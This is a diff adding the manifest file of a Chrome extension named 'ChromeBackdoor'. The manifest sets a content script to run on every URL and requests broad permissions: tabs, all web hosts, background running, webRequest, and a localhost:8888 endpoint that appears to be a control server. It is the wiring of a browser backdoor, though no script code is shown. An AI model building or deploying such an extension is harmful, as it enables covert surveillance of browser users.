@@ -1,0 +1,41 @@
+{
+    "name": "ChromeBackdoor",
+    "description": "https://github.com/graniet/",
+    "version": "1.0",
+    "manifest_version": 2,
+    "icons": { 
+    "16": "img/ico.png",
+    "32": "img/ico.png",
+    "48": "img/ico.png",
+    "128": "img/ico.png"
+    },
+    "background":{
+      "scripts":[
+          "js/call.js",
+          "lib/jquery.min.js"
+      ]
+    },
+    "browser_action": {
+        "default_icon": "img/ico.png",
+        "default_popup": "test.html"
+    },
+    "content_scripts": [
+        {
+            "matches": [
+                "<all_urls>"
+            ],
+            "js": [
+                "lib/jquery.min.js",
+                "js/check.js"
+            ]
+        }
+    ],
+  "permissions": [
+      "tabs",
+      "http://*/",
+      "https://*/",
+      "background",
+      "webRequest",
+      "http://localhost:8888/"
+  ]
+}
